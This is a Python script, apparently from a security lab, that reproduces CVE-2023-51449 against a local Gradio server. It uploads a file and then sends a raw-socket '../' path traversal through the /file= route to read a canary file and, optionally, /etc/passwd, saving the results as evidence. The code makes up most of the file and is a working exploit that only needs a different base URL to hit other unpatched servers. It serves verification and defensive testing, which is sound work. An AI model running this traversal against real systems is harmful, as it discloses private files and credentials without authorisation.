#!/usr/bin/env python3
"""Controlled probe for CVE-2023-51449 against a locally running Gradio instance.

Everything is local: the target is 127.0.0.1 and the file read proof uses a
synthetic canary that exists only inside the lab image (/srv/private/canary.txt).
The optional /etc/passwd check is a container-local file and is recorded as
secondary evidence only.

The script never sends anything to a remote host and never modifies the target.

Usage:
    python scripts/cve_2023_51449_probe.py \
        --base-url http://127.0.0.1:7860 \
        --label vulnerable \
        --out evidence/cve-2023-51449/probe-vulnerable.json
"""

from __future__ import annotations

import argparse
import http.client
import json
import sys
from datetime import datetime, timezone
from urllib.parse import urlsplit

import requests

CANARY_MARKER = "CANARY-CVE-2023-51449-7f3a9c1d"
PROBE_BODY = b"probe-upload-cve-2023-51449\n"


def raw_get(base_url: str, raw_path: str, timeout: int = 20) -> dict:
    """Send a GET with the path exactly as written.

    urllib3 (and therefore requests) rewrites dot segments in the request path,
    so the traversal has to be issued on a raw socket: otherwise the client
    silently collapses "..", the server never sees a traversal, and any 404
    would be a false negative caused by the tool rather than by the target.
    """
    parts = urlsplit(base_url)
    conn = http.client.HTTPConnection(parts.hostname, parts.port or 80, timeout=timeout)
    try:
        conn.putrequest("GET", raw_path, skip_host=True, skip_accept_encoding=True)
        conn.putheader("Host", f"{parts.hostname}:{parts.port or 80}")
        conn.putheader("User-Agent", "cve-2023-51449-probe")
        conn.putheader("Connection", "close")
        conn.endheaders()
        resp = conn.getresponse()
        body = resp.read().decode("utf-8", "replace")
        return {
            "request": f"GET {raw_path}",
            "status_code": resp.status,
            "content_type": resp.getheader("Content-Type", ""),
            "content_length": len(body),
            "body": body[:1200],
            "body_truncated": len(body) > 1200,
        }
    finally:
        conn.close()



def record(step: str, response: requests.Response, **extra) -> dict:
    body = response.text
    entry = {
        "step": step,
        "request": f"{response.request.method} {response.request.url}",
        "status_code": response.status_code,
        "content_type": response.headers.get("Content-Type", ""),
        "content_length": len(response.content),
        "body": body[:1200],
        "body_truncated": len(body) > 1200,
    }
    entry.update(extra)
    return entry


def main() -> int:
    parser = argparse.ArgumentParser()
    parser.add_argument("--base-url", required=True)
    parser.add_argument("--label", required=True, choices=["vulnerable", "fixed"])
    parser.add_argument("--out", required=True)
    parser.add_argument("--canary-path", default="/srv/private/canary.txt")
    parser.add_argument("--include-passwd", action="store_true")
    args = parser.parse_args()

    base = args.base_url.rstrip("/")
    # trust_env=False: the host exports HTTP_PROXY, which must not intercept
    # loopback traffic. This is the same reason evidence uses `curl --noproxy '*'`.
    session = requests.Session()
    session.trust_env = False

    result: dict = {
        "cve": "CVE-2023-51449",
        "label": args.label,
        "base_url": base,
        "started_utc": datetime.now(timezone.utc).isoformat(timespec="seconds"),
        "steps": [],
        "summary": {},
    }

    # 1. Application is up and serving the Gradio UI.
    r = session.get(f"{base}/", timeout=20)
    result["steps"].append(
        record("home_page", r, ui_present="gradio" in r.text.lower())
    )

    # 2. /config confirms the app loaded and exposes its version if present.
    r = session.get(f"{base}/config", timeout=20)
    version = None
    try:
        version = r.json().get("version")
    except ValueError:
        pass
    result["steps"].append(record("config", r, reported_version=version))

    # 3. Upload a harmless file; the response gives a path inside the temp dir.
    files = {"files": ("probe.txt", PROBE_BODY, "text/plain")}
    r = session.post(f"{base}/upload", files=files, timeout=30)
    uploaded_path = None
    try:
        payload = r.json()
        if isinstance(payload, list) and payload:
            uploaded_path = payload[0]
    except ValueError:
        pass
    result["steps"].append(record("upload_probe_file", r, uploaded_path=uploaded_path))

    if not uploaded_path:
        result["summary"] = {"error": "upload failed, cannot continue"}
        with open(args.out, "w", encoding="utf-8") as fh:
            json.dump(result, fh, indent=2, ensure_ascii=False)
        print("upload failed", file=sys.stderr)
        return 2

    # 4. Baseline: the just-uploaded file is legitimately served.
    r = session.get(f"{base}/file={uploaded_path}", timeout=20)
    result["steps"].append(
        record(
            "baseline_legit_read",
            r,
            expected="200 with probe body",
            body_matches=r.content == PROBE_BODY,
        )
    )

    # 5. Traversal to the canary, which lives outside the Gradio temp directory.
    #    The traversal starts from the upload *directory* (the parent of the
    #    uploaded file): "probe.txt/.." cannot be resolved by the kernel because
    #    a regular file is not a directory (ENOTDIR), so starting at the file
    #    would test the wrong thing. The path is sent literally on a raw socket,
    #    so nothing client-side can rewrite ".." and create a false negative.
    upload_dir = uploaded_path.rsplit("/", 1)[0]
    traversal_path = (
        f"/file={upload_dir}/../../../../../../{args.canary_path.lstrip('/')}"
    )
    trav = raw_get(base, traversal_path)
    canary_leaked = CANARY_MARKER in trav["body"]
    trav["step"] = "traversal_canary"
    trav["target"] = args.canary_path
    trav["traversal_base"] = upload_dir
    trav["canary_leaked"] = canary_leaked
    result["steps"].append(trav)

    if args.include_passwd:
        passwd_path = f"/file={upload_dir}/../../../../../../etc/passwd"
        sec = raw_get(base, passwd_path)
        sec["step"] = "traversal_etc_passwd_secondary"
        sec["target"] = "/etc/passwd (container-local, secondary evidence)"
        sec["passwd_disclosed"] = "root:" in sec["body"]
        result["steps"].append(sec)

    # 6. Normal application function: the text interface must still answer.
    #    Gradio 4.x answers /run/predict directly with the result payload on this
    #    app; older clients use a two-step /call + event-stream flow. Both shapes
    #    are accepted and the endpoint actually used is recorded.
    functional = False
    endpoint_used = None
    for endpoint in ("/run/predict", "/call/predict"):
        try:
            r = session.post(
                f"{base}{endpoint}",
                json={"data": ["World"], "fn_index": 0},
                timeout=30,
            )
        except requests.RequestException:
            continue
        if r.status_code != 200:
            continue
        endpoint_used = endpoint
        result["steps"].append(record(f"function_call{endpoint}", r))
        try:
            payload = r.json()
        except ValueError:
            continue
        if isinstance(payload, dict) and "data" in payload:
            functional = "Hello World" in json.dumps(payload["data"])
            if functional:
                break
            continue
        event_id = payload.get("event_id") if isinstance(payload, dict) else None
        if not event_id:
            continue
        stream = session.get(f"{base}{endpoint}/{event_id}", timeout=30)
        functional = "Hello World" in stream.text
        result["steps"].append(
            record(f"function_result{endpoint}", stream, greeting_returned=functional)
        )
        if functional:
            break

    result["summary"] = {
        "app_reachable": result["steps"][0]["status_code"] == 200,
        "reported_version": result["steps"][1].get("reported_version"),
        "upload_path": uploaded_path,
        "baseline_legit_read_ok": result["steps"][3].get("body_matches", False),
        "canary_leaked": canary_leaked,
        "traversal_status": result["steps"][4]["status_code"],
        "normal_function_ok": functional,
        "function_endpoint": endpoint_used,
    }
    result["finished_utc"] = datetime.now(timezone.utc).isoformat(timespec="seconds")

    with open(args.out, "w", encoding="utf-8") as fh:
        json.dump(result, fh, indent=2, ensure_ascii=False)

    print(json.dumps(result["summary"], indent=2))
    return 0


if __name__ == "__main__":
    sys.exit(main())
